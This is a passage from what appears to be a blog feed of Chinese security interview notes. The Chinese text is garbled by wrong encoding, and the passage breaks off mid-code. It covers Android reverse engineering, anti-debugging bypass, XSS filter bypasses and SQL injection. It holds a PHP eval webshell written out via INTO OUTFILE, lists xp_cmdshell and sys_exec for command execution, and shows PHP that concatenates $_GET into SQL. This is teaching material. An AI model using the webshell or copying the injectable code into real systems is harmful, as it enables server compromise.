title="Fridaæ˜¯åŸºäºptraceå‡½æ•°æ³¨å…¥çš„,èƒ½è¯´ä¸‹ptraceè¿™ä¸ªå‡½æ•°å—?"></a>Fridaæ˜¯åŸºäºptraceå‡½æ•°æ³¨å…¥çš„,èƒ½è¯´ä¸‹ptraceè¿™ä¸ªå‡½æ•°å—?</h2><p><code>ptrace</code>æ˜¯ä¸€ä¸ªç³»ç»Ÿè°ƒç”¨ï¼Œç”¨äºè¿›ç¨‹è·Ÿè¸ªå’Œæ§åˆ¶ã€‚å®ƒå…è®¸ä¸€ä¸ªè¿›ç¨‹ï¼ˆå¦‚è°ƒè¯•å™¨ï¼‰é™„åŠ åˆ°å¦ä¸€ä¸ªè¿›ç¨‹ï¼ˆå¦‚ç›®æ ‡ç¨‹åºï¼‰ï¼Œå¹¶æ§åˆ¶å…¶æ‰§è¡Œã€è¯»å–å’Œä¿®æ”¹å…¶å†…å­˜ã€‚Fridaåˆ©ç”¨<code>ptrace</code>å‡½æ•°é™„åŠ åˆ°ç›®æ ‡è¿›ç¨‹ï¼Œæ³¨å…¥ä»£ç å¹¶è¿›è¡ŒHookæ“ä½œã€‚</p><h2 id="ollvmæ··æ·†åŸç†äº†è§£å—-è¯´ä¸‹å¦‚ä½•å¯¹æŠ—æµç¨‹æ§åˆ¶å¹³å¦åŒ–"><a href="#ollvmæ··æ·†åŸç†äº†è§£å—-è¯´ä¸‹å¦‚ä½•å¯¹æŠ—æµç¨‹æ§åˆ¶å¹³å¦åŒ–" class="headerlink" title=".ollvmæ··æ·†åŸç†äº†è§£å—?è¯´ä¸‹å¦‚ä½•å¯¹æŠ—æµç¨‹æ§åˆ¶å¹³å¦åŒ–."></a>.ollvmæ··æ·†åŸç†äº†è§£å—?è¯´ä¸‹å¦‚ä½•å¯¹æŠ—æµç¨‹æ§åˆ¶å¹³å¦åŒ–.</h2><p>OLLVMï¼ˆObfuscator-LLVMï¼‰æ˜¯ä¸€ç§åŸºäºLLVMçš„ä»£ç æ··æ·†å·¥å…·ï¼Œé€šè¿‡æ§åˆ¶æµå¹³å¦åŒ–ã€è™šå‡æ§åˆ¶æµç­‰æŠ€æœ¯ä¿æŠ¤ä»£ç ä¸è¢«é€†å‘å·¥ç¨‹ã€‚</p><h3 id="å¯¹æŠ—æµç¨‹æ§åˆ¶å¹³å¦åŒ–"><a href="#å¯¹æŠ—æµç¨‹æ§åˆ¶å¹³å¦åŒ–" class="headerlink" title="å¯¹æŠ—æµç¨‹æ§åˆ¶å¹³å¦åŒ–"></a>å¯¹æŠ—æµç¨‹æ§åˆ¶å¹³å¦åŒ–</h3><p>å¯¹æŠ—æµç¨‹æ§åˆ¶å¹³å¦åŒ–çš„å¸¸ç”¨æ–¹æ³•åŒ…æ‹¬ï¼š</p><ul><li><strong>é™æ€åˆ†æ</strong>ï¼šä½¿ç”¨å…ˆè¿›çš„é™æ€åˆ†æå·¥å…·ï¼Œå°è¯•è¿˜åŸåŸå§‹çš„æ§åˆ¶æµå›¾ã€‚</li><li><strong>åŠ¨æ€åˆ†æ</strong>ï¼šé€šè¿‡åŠ¨æ€æ‰§è¡Œå’Œè°ƒè¯•ï¼Œè§‚å¯Ÿç¨‹åºçš„å®é™…è¡Œä¸ºï¼Œç»•è¿‡æ··æ·†ã€‚</li><li><strong>æ¨¡å¼åŒ¹é…</strong>ï¼šè¯†åˆ«å¸¸è§çš„æ··æ·†æ¨¡å¼ï¼Œç¼–å†™è§„åˆ™è¿›è¡Œè‡ªåŠ¨è„±æ··ã€‚</li></ul><h2 id="äº†è§£åè°ƒè¯•æ‰‹æ®µå—-è¯´ä¸‹å¦‚ä½•ååè°ƒè¯•-é‡ç‚¹-é—®çš„å¾ˆç»†"><a href="#äº†è§£åè°ƒè¯•æ‰‹æ®µå—-è¯´ä¸‹å¦‚ä½•ååè°ƒè¯•-é‡ç‚¹-é—®çš„å¾ˆç»†" class="headerlink" title="äº†è§£åè°ƒè¯•æ‰‹æ®µå—?è¯´ä¸‹å¦‚ä½•ååè°ƒè¯•(é‡ç‚¹,é—®çš„å¾ˆç»†)"></a>äº†è§£åè°ƒè¯•æ‰‹æ®µå—?è¯´ä¸‹å¦‚ä½•ååè°ƒè¯•(é‡ç‚¹,é—®çš„å¾ˆç»†)</h2><p>åè°ƒè¯•æŠ€æœ¯ç”¨äºæ£€æµ‹å’Œé˜»æ­¢è°ƒè¯•å™¨é™„åŠ åˆ°è¿›ç¨‹ã€‚å¸¸è§çš„åè°ƒè¯•æ‰‹æ®µåŒ…æ‹¬ï¼š</p><ul><li><strong>æ£€æµ‹è°ƒè¯•ç«¯å£</strong>ï¼šæ£€æŸ¥ç‰¹å®šçš„è°ƒè¯•ç«¯å£æ˜¯å¦è¢«å ç”¨ã€‚</li><li><strong>è‡ªå¸¦è°ƒè¯•å‡½æ•°</strong>ï¼šä½¿ç”¨è‡ªå®šä¹‰çš„è°ƒè¯•æ£€æµ‹å‡½æ•°ã€‚</li><li><strong>TracerPidæ£€æµ‹</strong>ï¼šæ£€æŸ¥<code>/proc/self/status</code>ä¸­çš„<code>TracerPid</code>å€¼æ˜¯å¦ä¸º0ã€‚</li><li><strong>ptraceå‡½æ•°æ£€æµ‹</strong>ï¼šå°è¯•ä½¿ç”¨<code>ptrace</code>å‡½æ•°ï¼Œæ£€æµ‹æ˜¯å¦è¢«è·Ÿè¸ªã€‚</li></ul><p>ååè°ƒè¯•çš„æ–¹æ³•åŒ…æ‹¬ï¼š</p><ul><li><strong>æ¨¡æ‹Ÿæ­£å¸¸è¡Œä¸º</strong>ï¼šåœ¨æ£€æµ‹è¿‡ç¨‹ä¸­æ¨¡æ‹Ÿæ­£å¸¸çš„åº”ç”¨è¡Œä¸ºï¼Œç»•è¿‡æ£€æµ‹ã€‚</li><li><strong>ä¿®æ”¹æ£€æµ‹é€»è¾‘</strong>ï¼šé€šè¿‡é€†å‘å·¥ç¨‹ä¿®æ”¹åè°ƒè¯•ä»£ç çš„é€»è¾‘ã€‚</li><li><strong>ä½¿ç”¨é«˜çº§è°ƒè¯•å·¥å…·</strong>ï¼šå¦‚Fridaç­‰ï¼Œèƒ½å¤Ÿåœ¨ä¸è§¦å‘åè°ƒè¯•æœºåˆ¶çš„æƒ…å†µä¸‹æ³¨å…¥å’Œè°ƒè¯•ã€‚</li></ul><h2 id="è¯´ä¸‹Androidçš„IPCæœºåˆ¶"><a href="#è¯´ä¸‹Androidçš„IPCæœºåˆ¶" class="headerlink" title="è¯´ä¸‹Androidçš„IPCæœºåˆ¶"></a>è¯´ä¸‹Androidçš„IPCæœºåˆ¶</h2><p>Androidçš„IPCï¼ˆInter-Process Communicationï¼‰æœºåˆ¶ä¸»è¦åŒ…æ‹¬ä»¥ä¸‹å‡ ç§ï¼š</p><h3 id="Binder"><a href="#Binder" class="headerlink" title="Binder"></a>Binder</h3><p>Binderæ˜¯Androidç³»ç»Ÿä¸­ä¸»è¦çš„IPCæœºåˆ¶ï¼Œå…·æœ‰ä»¥ä¸‹ä¼˜ç‚¹ï¼š</p><ul><li><strong>é«˜æ•ˆæ€§</strong>ï¼šBinderæœºåˆ¶åœ¨å†…æ ¸ç©ºé—´ä¸­å®ç°ï¼Œå‡å°‘äº†ç”¨æˆ·ç©ºé—´å’Œå†…æ ¸ç©ºé—´çš„æ•°æ®æ‹·è´ã€‚</li><li><strong>çµæ´»æ€§</strong>ï¼šæ”¯æŒå¤šç§é€šä¿¡æ–¹å¼ï¼Œå¦‚å•å‘é€šä¿¡ã€åŒå‘é€šä¿¡ç­‰ã€‚</li><li><strong>å®‰å…¨æ€§</strong>ï¼šé€šè¿‡æƒé™æ§åˆ¶å’Œèº«ä»½éªŒè¯ï¼Œç¡®ä¿é€šä¿¡çš„å®‰å…¨æ€§ã€‚</li></ul><h3 id="å®ç°ä¸€æ¬¡æ‹·è´çš„è¿‡ç¨‹"><a href="#å®ç°ä¸€æ¬¡æ‹·è´çš„è¿‡ç¨‹" class="headerlink" title="å®ç°ä¸€æ¬¡æ‹·è´çš„è¿‡ç¨‹"></a>å®ç°ä¸€æ¬¡æ‹·è´çš„è¿‡ç¨‹</h3><p>Binderåœ¨å®ç°æ•°æ®ä¼ è¾“æ—¶ï¼Œé€šè¿‡ä»¥ä¸‹æ­¥éª¤å®ç°ä¸€æ¬¡æ‹·è´ï¼š</p><ol><li><strong>ç”¨æˆ·ç©ºé—´åˆ°å†…æ ¸ç©ºé—´</strong>ï¼šå‘é€æ–¹å°†æ•°æ®ä»ç”¨æˆ·ç©ºé—´æ‹·è´åˆ°å†…æ ¸ç©ºé—´çš„ç¼“å†²åŒºã€‚</li><li><strong>å†…æ ¸ç©ºé—´åˆ°æ¥æ”¶æ–¹ç”¨æˆ·ç©ºé—´</strong>ï¼šæ¥æ”¶æ–¹ä»å†…æ ¸ç©ºé—´çš„ç¼“å†²åŒºè¯»å–æ•°æ®ï¼Œå®Œæˆæ•°æ®ä¼ è¾“ã€‚</li></ol><h2 id="è¯´ä¸€ä¸‹ä½ å¯¹å®‰å“é‡Œé¢çš„zygoteçš„ç†è§£"><a href="#è¯´ä¸€ä¸‹ä½ å¯¹å®‰å“é‡Œé¢çš„zygoteçš„ç†è§£" class="headerlink" title="è¯´ä¸€ä¸‹ä½ å¯¹å®‰å“é‡Œé¢çš„zygoteçš„ç†è§£"></a>è¯´ä¸€ä¸‹ä½ å¯¹å®‰å“é‡Œé¢çš„zygoteçš„ç†è§£</h2><p>Zygoteæ˜¯Androidç³»ç»Ÿä¸­çš„ä¸€ä¸ªé‡è¦è¿›ç¨‹ï¼Œè´Ÿè´£forkå‡ºæ–°çš„åº”ç”¨è¿›ç¨‹ã€‚Zygoteåœ¨ç³»ç»Ÿå¯åŠ¨æ—¶è¢«åˆ›å»ºï¼Œé¢„åŠ è½½äº†ç³»ç»Ÿèµ„æºå’Œå…¬å…±åº“ï¼Œä»è€ŒåŠ å¿«åº”ç”¨çš„å¯åŠ¨é€Ÿåº¦ã€‚</p><h3 id="Zygoteçš„IPCé€šä¿¡æœºåˆ¶ä¸ºä»€ä¹ˆä¸é‡‡ç”¨Binder"><a href="#Zygoteçš„IPCé€šä¿¡æœºåˆ¶ä¸ºä»€ä¹ˆä¸é‡‡ç”¨Binder" class="headerlink" title="Zygoteçš„IPCé€šä¿¡æœºåˆ¶ä¸ºä»€ä¹ˆä¸é‡‡ç”¨Binder?"></a>Zygoteçš„IPCé€šä¿¡æœºåˆ¶ä¸ºä»€ä¹ˆä¸é‡‡ç”¨Binder?</h3><p>Zygoteçš„IPCé€šä¿¡æœºåˆ¶ä¸é‡‡ç”¨Binderçš„åŸå› ä¸»è¦åŒ…æ‹¬ï¼š</p><ul><li><strong>æ€§èƒ½è€ƒè™‘</strong>ï¼šZygoteåœ¨forkå­è¿›ç¨‹æ—¶ï¼Œéœ€è¦é«˜æ•ˆçš„è¿›ç¨‹åˆ›å»ºæœºåˆ¶ã€‚Binderæœºåˆ¶åœ¨æŸäº›åœºæ™¯ä¸‹å¯èƒ½å¼•å…¥é¢å¤–çš„å¼€é”€ã€‚</li><li><strong>è®¾è®¡ç›®çš„</strong>ï¼šZygoteçš„ä¸»è¦ç›®çš„æ˜¯å¿«é€Ÿåˆ›å»ºæ–°çš„è¿›ç¨‹ï¼Œè€Œä¸æ˜¯è¿›è¡Œå¤æ‚çš„IPCé€šä¿¡ã€‚å› æ­¤ï¼Œå®ƒé‡‡ç”¨äº†æ›´ç›´æ¥çš„forkæœºåˆ¶ã€‚</li></ul>]]></content>
      
      
      
    </entry>
    
    
    
    <entry>
      <title>ã€å·¥ä½œã€‘é¢è¯•é¢˜æ•´ç† ç½‘ç»œæ”¶é›†é—®é¢˜</title>
      <link href="/2024/03/16/work/workpre3/"/>
      <url>/2024/03/16/work/workpre3/</url>
      
        <content type="html"><![CDATA[<p>ä»¥ä¸‹æ˜¯å¯¹è¿™äº›é—®é¢˜çš„å›ç­”ï¼Œå°½é‡åšåˆ°å…¨é¢ä¸”å‡†ç¡®ã€‚ä½†è¯·æ³¨æ„ï¼Œå®‰å…¨é¢†åŸŸçš„çŸ¥è¯†ä¸æ–­æ›´æ–°ï¼Œå®é™…é¢è¯•ä¸­è¿˜éœ€è¦æ ¹æ®å…·ä½“æƒ…å†µè¿›è¡Œçµæ´»åº”å¯¹ã€‚</p><hr><h3 id="XSSï¼ˆè·¨ç«™è„šæœ¬æ”»å‡»ï¼‰"><a href="#XSSï¼ˆè·¨ç«™è„šæœ¬æ”»å‡»ï¼‰" class="headerlink" title="XSSï¼ˆè·¨ç«™è„šæœ¬æ”»å‡»ï¼‰"></a>XSSï¼ˆè·¨ç«™è„šæœ¬æ”»å‡»ï¼‰</h3><h4 id="XSSå¯¹å¼•å·å®ä½“çš„ç»•è¿‡ï¼ˆaæ ‡ç­¾ï¼‰"><a href="#XSSå¯¹å¼•å·å®ä½“çš„ç»•è¿‡ï¼ˆaæ ‡ç­¾ï¼‰" class="headerlink" title="XSSå¯¹å¼•å·å®ä½“çš„ç»•è¿‡ï¼ˆaæ ‡ç­¾ï¼‰"></a>XSSå¯¹å¼•å·å®ä½“çš„ç»•è¿‡ï¼ˆaæ ‡ç­¾ï¼‰</h4><p>æ”»å‡»è€…å¯ä»¥é€šè¿‡ä¸€äº›æŠ€å·§ç»•è¿‡å¯¹å¼•å·çš„è¿‡æ»¤ã€‚ä¾‹å¦‚ï¼Œå¦‚æœè¿‡æ»¤äº†åŒå¼•å·<code>&quot;</code>ï¼Œå¯ä»¥ä½¿ç”¨å•å¼•å·<code>&#39;</code>æˆ–HTMLå®ä½“<code>&amp;#x27;</code>æ¥æ›¿ä»£ã€‚å¯¹äº<code>a</code>æ ‡ç­¾ï¼Œæ”»å‡»è€…å¯ä»¥æ„é€ ç±»ä¼¼ä»¥ä¸‹çš„æ¶æ„ä»£ç ï¼š</p><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">a</span> <span class="attr">href</span>=<span class="string">&#x27;javascript:alert(1)&#x27;</span>&gt;</span>Click Me<span class="tag">&lt;/<span class="name">a</span>&gt;</span></span><br></pre></td></tr></table></figure><p>å¦‚æœè¿‡æ»¤äº†<code>javascript:</code>ï¼Œå¯ä»¥ä½¿ç”¨å…¶ä»–äº‹ä»¶å¤„ç†ç¨‹åºï¼Œå¦‚<code>onerror</code>ï¼š</p><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">a</span> <span class="attr">href</span>=<span class="string">&quot;http://example.com&quot;</span> <span class="attr">onerror</span>=<span class="string">&quot;alert(1)&quot;</span>&gt;</span>Click Me<span class="tag">&lt;/<span class="name">a</span>&gt;</span></span><br></pre></td></tr></table></figure><h4 id="å¯Œæ–‡æœ¬ç¼–è¾‘å™¨è§£å†³XSSæ¼æ´é—®é¢˜"><a href="#å¯Œæ–‡æœ¬ç¼–è¾‘å™¨è§£å†³XSSæ¼æ´é—®é¢˜" class="headerlink" title="å¯Œæ–‡æœ¬ç¼–è¾‘å™¨è§£å†³XSSæ¼æ´é—®é¢˜"></a>å¯Œæ–‡æœ¬ç¼–è¾‘å™¨è§£å†³XSSæ¼æ´é—®é¢˜</h4><p>å¯Œæ–‡æœ¬ç¼–è¾‘å™¨é€šå¸¸ä¼šé‡‡ç”¨ä»¥ä¸‹æ–¹æ³•æ¥é˜²æ­¢XSSæ”»å‡»ï¼š</p><ul><li><strong>å†…å®¹å‡€åŒ–</strong>ï¼šåœ¨å°†ç”¨æˆ·è¾“å…¥çš„å†…å®¹æ¸²æŸ“åˆ°é¡µé¢ä¹‹å‰ï¼Œå¯¹å†…å®¹è¿›è¡Œå‡€åŒ–ï¼Œç§»é™¤æˆ–è½¬ä¹‰å¯èƒ½çš„æ¶æ„è„šæœ¬ã€‚</li><li><strong>ç™½åå•ç­–ç•¥</strong>ï¼šåªå…è®¸ç‰¹å®šçš„HTMLæ ‡ç­¾å’Œå±æ€§ï¼Œå…¶ä»–æ ‡ç­¾å’Œå±æ€§éƒ½ä¼šè¢«è¿‡æ»¤æ‰ã€‚</li><li><strong>ä½¿ç”¨å®‰å…¨çš„æ¸²æŸ“æ–¹å¼</strong>ï¼šä¾‹å¦‚ï¼Œä½¿ç”¨<code>textContent</code>è€Œä¸æ˜¯<code>innerHTML</code>æ¥æ’å…¥å†…å®¹ï¼Œé¿å…HTMLä»£ç è¢«è§£ææ‰§è¡Œã€‚</li><li><strong>å†…å®¹å®‰å…¨ç­–ç•¥ï¼ˆCSPï¼‰</strong>ï¼šé€šè¿‡è®¾ç½®CSPå¤´ï¼Œé™åˆ¶å¯Œæ–‡æœ¬å†…å®¹ä¸­å¯ä»¥åŠ è½½çš„èµ„æºæ¥æºå’Œæ‰§è¡Œçš„è„šæœ¬ã€‚</li></ul><h4 id="å¯Œæ–‡æœ¬æ¸²æŸ“çš„é¢„é˜²"><a href="#å¯Œæ–‡æœ¬æ¸²æŸ“çš„é¢„é˜²" class="headerlink" title="å¯Œæ–‡æœ¬æ¸²æŸ“çš„é¢„é˜²"></a>å¯Œæ–‡æœ¬æ¸²æŸ“çš„é¢„é˜²</h4><p>å¯Œæ–‡æœ¬ç¼–è¾‘å™¨åœ¨æ¸²æŸ“å†…å®¹æ—¶ï¼Œä¼šé€šè¿‡ä»¥ä¸‹æ–¹å¼é¢„é˜²XSSæ”»å‡»ï¼š</p><ul><li><strong>è½¬ä¹‰HTMLæ ‡ç­¾</strong>ï¼šå°†ç”¨æˆ·è¾“å…¥çš„HTMLæ ‡ç­¾è½¬ä¹‰ä¸ºæ–‡æœ¬å½¢å¼ï¼Œä¾‹å¦‚å°†<code>&lt;script&gt;</code>è½¬ä¹‰ä¸º<code>&amp;lt;script&amp;gt;</code>ã€‚</li><li><strong>é™åˆ¶è„šæœ¬æ‰§è¡Œ</strong>ï¼šé€šè¿‡CSPå¤´æˆ–å…¶ä»–å®‰å…¨æœºåˆ¶ï¼Œé™åˆ¶å¯Œæ–‡æœ¬å†…å®¹ä¸­è„šæœ¬çš„æ‰§è¡Œã€‚</li><li><strong>æ²™ç®±ç¯å¢ƒ</strong>ï¼šå°†å¯Œæ–‡æœ¬å†…å®¹æ¸²æŸ“åœ¨ä¸€ä¸ªæ²™ç®±ç¯å¢ƒä¸­ï¼Œé™åˆ¶å…¶å¯¹é¡µé¢å…¶ä»–éƒ¨åˆ†çš„è®¿é—®å’Œæ“ä½œã€‚</li></ul><h3 id="2-SQLæ³¨å…¥"><a href="#2-SQLæ³¨å…¥" class="headerlink" title="2. SQLæ³¨å…¥"></a>2. SQLæ³¨å…¥</h3><h4 id="æ‹¿WebShellçš„æ–¹æ³•"><a href="#æ‹¿WebShellçš„æ–¹æ³•" class="headerlink" title="æ‹¿WebShellçš„æ–¹æ³•"></a>æ‹¿WebShellçš„æ–¹æ³•</h4><ul><li><strong>é€šè¿‡SQLæ³¨å…¥å†™å…¥æ–‡ä»¶</strong>ï¼šåˆ©ç”¨æŸäº›æ•°æ®åº“çš„å†™æ–‡ä»¶åŠŸèƒ½ï¼Œå¦‚MySQLçš„<code>INTO OUTFILE</code>ï¼Œå°†WebShellä»£ç å†™å…¥åˆ°æœåŠ¡å™¨çš„Webç›®å½•ä¸­ã€‚<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">SELECT</span> <span class="string">&#x27;&lt;?php @eval($_POST[&quot;cmd&quot;]);?&gt;&#x27;</span> <span class="keyword">INTO</span> OUTFILE <span class="string">&#x27;/var/www/html/shell.php&#x27;</span>;</span><br></pre></td></tr></table></figure></li><li><strong>é€šè¿‡SQLæ³¨å…¥ä¿®æ”¹æ•°æ®åº“å†…å®¹</strong>ï¼šå¦‚æœæ•°æ®åº“ä¸­å­˜å‚¨äº†Webé¡µé¢çš„HTMLå†…å®¹ï¼Œå¯ä»¥é€šè¿‡SQLæ³¨å…¥ä¿®æ”¹è¿™äº›å†…å®¹ï¼ŒåµŒå…¥WebShellä»£ç ã€‚</li><li><strong>é€šè¿‡SQLæ³¨å…¥æ‰§è¡Œç³»ç»Ÿå‘½ä»¤</strong>ï¼šåœ¨æŸäº›æƒ…å†µä¸‹ï¼Œå¯ä»¥é€šè¿‡SQLæ³¨å…¥æ‰§è¡Œç³»ç»Ÿå‘½ä»¤ï¼Œå¦‚MySQLçš„<code>sys_exec</code>å‡½æ•°ï¼ˆéœ€è¦UDFæ”¯æŒï¼‰ã€‚</li></ul><h4 id="èƒ½å†™å…¥çš„å‡½æ•°"><a href="#èƒ½å†™å…¥çš„å‡½æ•°" class="headerlink" title="èƒ½å†™å…¥çš„å‡½æ•°"></a>èƒ½å†™å…¥çš„å‡½æ•°</h4><ul><li><strong>MySQL</strong>ï¼š<ul><li><code>INTO OUTFILE</code>ï¼šå°†æŸ¥è¯¢ç»“æœå†™å…¥åˆ°æ–‡ä»¶ä¸­ã€‚</li><li><code>LOAD_FILE</code>ï¼šè¯»å–æ–‡ä»¶å†…å®¹ï¼Œä½†ä¸èƒ½ç›´æ¥å†™å…¥ã€‚</li><li><code>sys_exec</code>ï¼ˆéœ€è¦UDFæ”¯æŒï¼‰ï¼šæ‰§è¡Œç³»ç»Ÿå‘½ä»¤ã€‚</li></ul></li><li><strong>MSSQL</strong>ï¼š<ul><li><code>xp_cmdshell</code>ï¼šæ‰§è¡Œç³»ç»Ÿå‘½ä»¤ã€‚</li><li><code>sp_oacreate</code>ï¼šé€šè¿‡OLEè‡ªåŠ¨åŒ–è¿‡ç¨‹æ‰§è¡Œç³»ç»Ÿå‘½ä»¤ã€‚</li></ul></li><li><strong>Oracle</strong>ï¼š<ul><li><code>UTL_FILE</code>ï¼šç”¨äºæ–‡ä»¶æ“ä½œã€‚</li><li><code>DBMS_SCHEDULER</code>ï¼šå¯ä»¥æ‰§è¡Œç³»ç»Ÿå‘½ä»¤ã€‚</li></ul></li></ul><h4 id="UDFææƒçš„åº•å±‚åŸç†"><a href="#UDFææƒçš„åº•å±‚åŸç†" class="headerlink" title="UDFææƒçš„åº•å±‚åŸç†"></a>UDFææƒçš„åº•å±‚åŸç†</h4><p>UDFï¼ˆUser-Defined Functionï¼‰ææƒæ˜¯é€šè¿‡åœ¨æ•°æ®åº“ä¸­åˆ›å»ºè‡ªå®šä¹‰å‡½æ•°æ¥å®ç°çš„ã€‚ä»¥MySQLä¸ºä¾‹ï¼Œæ”»å‡»è€…é¦–å…ˆéœ€è¦å°†ä¸€ä¸ªæ¶æ„çš„DLLæ–‡ä»¶ï¼ˆWindowsï¼‰æˆ–SOæ–‡ä»¶ï¼ˆLinuxï¼‰ä¸Šä¼ åˆ°æœåŠ¡å™¨ä¸Šï¼Œç„¶ååœ¨MySQLä¸­åˆ›å»ºä¸€ä¸ªUDFå‡½æ•°ï¼ŒæŒ‡å‘è¿™ä¸ªæ¶æ„çš„DLLæˆ–SOæ–‡ä»¶ã€‚å½“è°ƒç”¨è¿™ä¸ªUDFå‡½æ•°æ—¶ï¼Œæ¶æ„ä»£ç ä¼šè¢«æ‰§è¡Œï¼Œä»è€Œå®ç°ææƒæˆ–æ‰§è¡Œç³»ç»Ÿå‘½ä»¤ã€‚</p><h4 id="é¢„ç¼–è¯‘"><a href="#é¢„ç¼–è¯‘" class="headerlink" title="é¢„ç¼–è¯‘"></a>é¢„ç¼–è¯‘</h4><p>é¢„ç¼–è¯‘æ˜¯ä¸€ç§é˜²æ­¢SQLæ³¨å…¥çš„æŠ€æœ¯ï¼Œé€šè¿‡å°†SQLè¯­å¥å’Œå‚æ•°åˆ†å¼€å¤„ç†ï¼Œé¿å…äº†SQLè¯­å¥è¢«æ¶æ„æ‹¼æ¥ã€‚é¢„ç¼–è¯‘çš„åº•å±‚åŸç†æ˜¯å°†SQLè¯­å¥å‘é€ç»™æ•°æ®åº“æœåŠ¡å™¨è¿›è¡Œè§£æå’Œä¼˜åŒ–ï¼Œç„¶åå°†å‚æ•°å•ç‹¬å‘é€ï¼Œç”±æ•°æ®åº“æœåŠ¡å™¨è¿›è¡Œå®‰å…¨çš„å‚æ•°æ›¿æ¢ã€‚</p><h4 id="ä¸èƒ½é¢„ç¼–è¯‘çš„æƒ…å†µ"><a href="#ä¸èƒ½é¢„ç¼–è¯‘çš„æƒ…å†µ" class="headerlink" title="ä¸èƒ½é¢„ç¼–è¯‘çš„æƒ…å†µ"></a>ä¸èƒ½é¢„ç¼–è¯‘çš„æƒ…å†µ</h4><ul><li><strong>åŠ¨æ€è¡¨åæˆ–åˆ—å</strong>ï¼šå¦‚æœSQLè¯­å¥ä¸­çš„è¡¨åæˆ–åˆ—åæ˜¯åŠ¨æ€ç”Ÿæˆçš„ï¼Œæ— æ³•ä½¿ç”¨é¢„ç¼–è¯‘ï¼Œå› ä¸ºé¢„ç¼–è¯‘è¦æ±‚SQLè¯­å¥çš„ç»“æ„æ˜¯å›ºå®šçš„ã€‚<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="variable">$table</span> = <span class="variable">$_GET</span>[<span class="string">&#x27;table&#x27;</span>];</span><br><span class="line"><span class="variable">$stmt</span> = <span class="variable">$pdo</span>-&gt;<span class="title function_ invoke__">prepare</span>(<span class="string">&quot;SELECT * FROM <span class="subst">$table</span>&quot;</span>);</span><br></pre></td></tr></table></figure></li><li><strong>å¤æ‚çš„åŠ¨æ€SQL</strong>ï¼šæŸäº›å¤æ‚çš„SQLè¯­å¥ï¼Œå¦‚åŠ¨æ€ç”Ÿæˆçš„<code>WHERE</code>å­å¥ï¼Œå¯èƒ½æ— æ³•ç›´æ¥ä½¿ç”¨é¢„ç¼–è¯‘ã€‚<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="variable">$where</span> = <span class="string">&#x27;&#x27;</span>;</span><br><span class="line"><span class="keyword">if</span> (<span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;name&#x27;</span>])) &#123;</span><br><span class="line">    <span class="variable">$where</span> .= <span class="string">&quot; AND name = &#x27;<span class="subst">$_GET</span>[name]&#x27;&quot;</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">if</span> (<span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;age&#x27;</span>])) &#123;</span><br><span class="line">    <span class="variable">$where</span> .= <span class="string">&quot; AND age = <span class="subst">$_GET</span>[age]&quot;</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="variable">$stmt</span> = <span class="variable">$pdo</span>-&gt;<span class="title function_ invoke__">prepare</span>(<span class="string">&quot;SELECT * FROM users WHERE 1=1 <span class="subst">$where</span>&quot;</span>);</span><br></pre></td></tr></table></figure></li></ul><h4 id="ORDER-BYä¸èƒ½é¢„ç¼–è¯‘çš„åŸå› "><a href="#ORDER-BYä¸èƒ½é¢„ç¼–è¯‘çš„åŸå› " class="headerlink" title="ORDER BYä¸èƒ½é¢„ç¼–è¯‘çš„åŸå› "></a><code>ORDER BY</code>ä¸èƒ½é¢„ç¼–è¯‘çš„åŸå› </h4><p><code>ORDER BY</code>å­å¥ä¸­çš„å­—æ®µåé€šå¸¸æ˜¯åŠ¨æ€çš„ï¼Œæ— æ³•ç›´æ¥ä½¿ç”¨é¢„ç¼–è¯‘ã€‚ä¾‹å¦‚ï¼š</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="variable">$order</span> = <span class="variable">$_GET</span>[<span class="string">&#x27;order&#x27;</span>];</span><br><span class="line"><span class="variable">$stmt</span> = <span class="variable">$pdo</span>-&gt;<span class="title function_ invoke__">prepare</span>(<span class="string">&quot;SELECT * FROM users ORDER BY <span class="subst">$order</span>&quot;</span>);</span><br></pre></td></tr></table></figure><p>åœ¨è¿™ç§æƒ…å†µä¸‹ï¼Œ<code>$order</code>æ˜¯åŠ¨æ€çš„ï¼Œæ— æ³•ä½œä¸ºé¢„ç¼–è¯‘çš„ä¸€éƒ¨åˆ†ã€‚å¦‚æœç›´æ¥æ‹¼æ¥ï¼Œå¯èƒ½ä¼šå¯¼è‡´SQLæ³¨å…¥ã€‚<br><a href="https://www.cnblogs.com/lsdb/p/12084038.html">è¿™ç¯‡åšå®¢è®²çš„å¾ˆä¸é”™</a></p><h4 id="ORDER-BYè¯­æ³•æ ‘æŠ¥é”™çš„åŸå› "><a href="#ORDER-BYè¯­æ³•æ ‘æŠ¥é”™çš„åŸå› " class="headerlink" title="ORDER BYè¯­æ³•æ ‘æŠ¥é”™çš„åŸå› "></a><code>ORDER BY</code>è¯­æ³•æ ‘æŠ¥é”™çš„åŸå› </h4><p><code>ORDER BY</code>å­å¥ä¸­çš„å­—æ®µåæ˜¯SQLè¯­å¥çš„ä¸€éƒ¨åˆ†ï¼Œå¦‚æœå­—æ®µåè¢«æ¶æ„ç¯¡æ”¹ï¼Œå¯èƒ½ä¼šå¯¼è‡´è¯­æ³•æ ‘è§£æé”™è¯¯ã€‚ä¾‹å¦‚ï¼š</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">SELECT</span> <span class="operator">*</span> <span class="keyword">FROM</span> users <span class="keyword">ORDER</span> <span class="keyword">BY</span> <span class="number">1</span> <span class="keyword">DESC</span>, <span class="number">2</span> <span 